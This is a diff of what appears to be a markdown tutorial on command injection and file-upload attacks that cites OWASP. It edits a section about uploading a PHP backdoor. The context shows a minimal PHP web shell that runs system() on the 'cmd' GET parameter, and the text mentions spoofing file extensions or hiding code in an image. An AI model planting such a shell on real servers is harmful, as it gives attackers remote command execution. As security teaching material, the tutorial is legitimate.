@@ -303,7 +303,7 @@ echo "Sum: ",$z;
 ?>
 ```
 
-#### PHP backdoor exploitation script
+#### PHP backdoor exploitation shell
 ```php
 <?php
 $cmd=$_GET['cmd'];
@@ -313,6 +313,9 @@ system($cmd);
 
 - We will try either spoofing the file extensions or injecting the the code to this image. 
 ![Sneaky Pepe](https://pepethefrogfaith.files.wordpress.com/2016/11/smug-pepe2.jpg?w=640)
+- First let's try to upload a php script file. 
+![PHP script file](https://imgur.com/otwpqzK)
+
 
 ### References
 - [1] Command Injection - OWASP. Command Injection - OWASP [online]. Texas, USA: OWASP Foundation, 2018 [quoted. 2019-04-13]. Availiable from: https://www.owasp.org/index.php/Command_Injection
